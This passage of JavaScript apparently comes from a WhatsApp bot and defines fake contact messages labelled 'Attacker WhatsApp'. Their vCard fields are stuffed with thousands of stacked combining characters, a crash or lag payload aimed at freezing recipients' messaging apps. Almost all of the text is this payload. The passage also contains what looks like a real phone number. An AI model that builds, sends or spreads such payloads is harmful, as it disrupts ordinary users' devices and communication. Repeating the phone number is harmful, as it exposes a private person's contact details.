̵̨̡̭̝̪̖̱͟͢͢͡͠.̶̵̢̢̡͉̖̺̲̫͎̣͇̙̯̰̬̰̩ͤ̏ͮͫͫ͊́̋ͯ̿̏̓̄̇̉ͦ̎̑ͦ́̕͟͟͞҉̛̀͘͞.̷̨̡̧̡̗̳̞͎̟͇̭̦̮̬̙̃̑̀̓̒̌ͨ̉̂ͩͮ̇́ͨ̈́̀̀̀́́̕̕͟͜͜͡͝͝.̖̬̫̹̪̜̠̦̹̤̹̪̋̔ͬ̎ͤ̓̋̊͛ͤ̑͋̚҉̴̵̷̶̡̡̛̀̕͘͟͟͡͡҉̨͘.̵̶̵̧̧̛̗̘͚̝͓̰̭̫͎̠̜͔̗̅͐̅̃̓͋̀ͨ́͘͟͟͜͠͡҉̵͜͝.̓ͫͦͫ̄ͨͬ̔͑̎̏̅̍͂́ͤ̚.̸̓͗ͪ͂ͮ̂̑ͮ̑̀̕̕̕͢҉̵̸̨҉.̸̷̳̟̓̿ͧ̂̄ͮ̽ͮ̄ͦ̃́͋̒̚͏̴̢́́͘͢͢͢͜͞͡͡͏.̶̸̢͚̂̋ͫͬ͊̋ͬ́͊͌̅̍̍̂͆̊̈̚͏̷̡̧̢͟.̵̧̦͔̽̿ͣ̿ͣ̈͂̀.̷̭̝̞͈̌̉̚ͅ͏̷̷̧̧̛́͘͢͠.͔̤̺͚̖̜̲̝͍̓ͤ̊ͨ̅͑̎͜ͅ͏.̸̶͇̣̭̬̭͓̏ͬ͊̿̕͠҉̷̡̢̛̀͘͟͏̴.̨͕ͩ̓͋̿͛̏ͤ͛̋͆ͤ.̳̪̫͉̺̥͇͚͔̝͕̭͈̹̳̩͈̂͠.̷̸̨͖̖͍͙̪̥͙̤̣͚̅ͥ̈̓ͥͩͦ̋ͦͯ̈ͣͧ̈́̕̕͏҉́.̖̋̒̒ͮ̈͐̂̍͊ͨͯ̅͒ͦͣ̒̃́̚͢͡͠͏̶̨͏̶̶̧̧͘̕͡͡͡.̵̥͈͈̘͉̗͔̘̰̱̟̗͖̳̺̭̫̱̰̬ͨ̓̐͂̾ͪ̂̄̓̄͋̔̎̑͟͏̕͏͘҉̡́͠͏̸̵͘͠.͈͉̪̲͚̠͓͖̼̟͚͛ͭͭͭ͂ͫ͑̈͑ͮͦ.̡̧̥̺̗͕̲̥͎͎͔̠̞̤̠̯͚̟̥̥̹ͫ͛ͧͧ̿̓ͫ̅́͝͏̸̷̸̵̢̢̛̀͢͜͟͠͡͞͡.̶̸̷̢̨̛͎̘̭̟̰̩̍̅ͣ͊ͫ̋̄͆̈̋̎̓̒ͩ͐͛ͤ̂́̀́̚͢͠͞.̸̸̶̡̛̥͚̹̩̱̮́ͫ̃ͩ͒̆ͧ͟͜͡҉̴͡.̺̟̥͙̼̆͋̍͛̌̂ͪ̀̈́̓̊̓́ͅ҉̕͢͢.̴̡̡̢̡͎̲ͮ̎͑ͧ͑ͫ̂ͬ̊͌͘͢͞.̸̴̶̶̡̬̤͈̹̰͌́ͨ̿ͨ͐̀̕͢҉̸̨̛̛́͜͜͞͡͠.̶̵̛̰͖̹̮͍̬̫̭̤̪̲͇̤̰̗͆̊̽̌̐̾ͪ̄̐̽̃ͤ͑̀͏͏̡̛̛͢͜͢͜͞͝͞.̷̸̨̢̨̖̘͊ͦ̑͐ͩͪ͝.̲̘̮̝͎̦̖̬́͟͏҉.̨̡̠̳͓̘̟̰͚̠̝̉ͣ͌͐̀̈ͯͨͣ̽̽̽ͫ̀̕͏͏̷͜.̸̨̛̛̪̍ͣ̒̿͛ͨ͗̂͛́̾̾̇́̿̚͘̕.ͨ̓ͥ͐͌ͣ̓̒̌̆͏̸̴̶̸̷̸̧̛̛͜͡.̸̧̡̢̛̤̘͖͈̱̫̭̯̬͔̞̻̯͎͙̝ͣ̏́̽̔ͯͤͪ̑ͥ́͘͜͟͠͝͝͡͏̨̛͝͡͞.̷͇̫̻̻̣̥̗̘̪͖̯̂ͨ͒̆̅̋͛͋̋̓̂́͛́̉̀̕͜͡͏̷̧͝.̸̛̥͇̟͕̳͈̜̟͖͎̬̼̤͎̠̓̓̌͗̔̉̽ͦ̍̇͗̇̈̅ͥ͛̒ͩ̾ͦ́́͜͝ͅ҉̵̵̢҉̵̸̴̵̡̛͜.̴̵̸̵̧͕͕̼̺͉̝̫̭̓ͯͮͫ͐̃̕͠҉͏̸̢͢͟͠͞͠.̵̷̡̜̻͕̭̽́ͯ͛͗̈̍͆ͮ̂̊͌͂ͬ̾ͤͧ̋ͦ͡ͅ.̖̠͔̘̲̳̍ͦ̾̊͟͠.̵̨̡̨̙̥̳̠̬̜̬̹̙͉̳͂͋́ͩ̐͋̈̈̽̓̃ͧ̀͠.̵̷̴̥̱̘̮̤͓̙̻̠̹̳̙̤͔̖͗̀͢͡͡͏̴̛͟͡҉̸̧͜͢.̶̵̻̘̤̽̇̃̏͊ͤ̒ͥͥ͂̂̈̊ͧ̌̀̚͠҉̸̧̢̕͘͟͟.̴̨̟̣͙̝̹̗͍̮͚̱͕̝̹̤̃͑ͪͦ͆͂ͥ̉̽̎̒̓̓̓̾̀͟ͅ͏̴͟͝͏͡͏̷҉̴̶̢̛̛́͜.̵̷̢̛̝͙͓͎̲̣̗̯̗̰͈̻̪͇̺̾͒́͘͘͢͜͠.̷̢̘̪͍̭̭̩̳͖̱̻̣̰̞͔̳͙̝̣͍̦̐̒̇̍ͩ̍ͦ̑̇͌́̾ͦ͌ͮͨ́́͘̕͝͠͝҉̸̴̛̛͝.̷̸̳͙̫̮̲͈̬͖̖̟̪͉̃͋ͨ̋̑͆̅͛̾͜͜͜͜͞͠.̵̷̴̢͍̺̺̦̓ͫ͂ͥ͂͠.̶̝̱̺͓̳̭̻̞̟̦̼̖̥͔͙̠͇̆͠҉̶̷̶̷̡̨̨̛͘͘͟͡͡.̵̵̶̙̳̜̤͇̜̟̯̠̗̤̥͖ͣ̉̅̈́̊ͫͧ͌̄̌ͭ͑ͤ̍̃ͪ̉̉ͫ̀͢.̷̮̼̳͓̪̘͉͚͇̳͖̬̺̭͎̈̒̊ͪͪ̋̂́̑͗ͮ̄̑ͮ͝ͅ͏.̶̷̧̻̙̙̮͖͍͋̇́ͭ͛ͩͫͧͫ̾ͮ̔̚͜.̶̜̾͂͐͆̿̎̽͏̡̀̕͘͢͟͞.͕̱͉̖̰̝̩̲̖͋̄̈́̐ͧ͂̌̀̅̉̆ͣ̓̎̄̑̌͏̛͏̴̸̶̴̴̨̨̛̛́͘͜͡͡͠.̴̵̮̼̺̣̺̩̭̱̞̻̺͙̊̃̃́͟͢.̡̧̧̛̛̠̳̩͓̝̭̠͈̠̰͖͔̯ͨͩͯͯ̋̔ͯ͂͆̾̾ͫ͆͑́́͘͘͘͢͟͜͟͠͠͝͡͠ͅͅ.̷̸̢̛̠̀ͩ̄ͩ̀́̀͜͡͞͝͞.̜̎̂̃͏̶̵̧́́͜͝.̵̖̩͉͎̟̮̰̪̼̪̱͒̿̓ͭ͆͛̆̓ͦͯͪ͒ͧͣ̅̆ͬ͝͡͡ͅ҉̶̷̨̢̡͘͢͟͞͠.̷̶̣̤̟̹̥͙͍̟̹̉͂ͯ͐̒̈́ͧ̐́ͧͣͬͤ͋͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"}}}
const gcc = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;🔥 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 🔥\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̒͛ͧ̊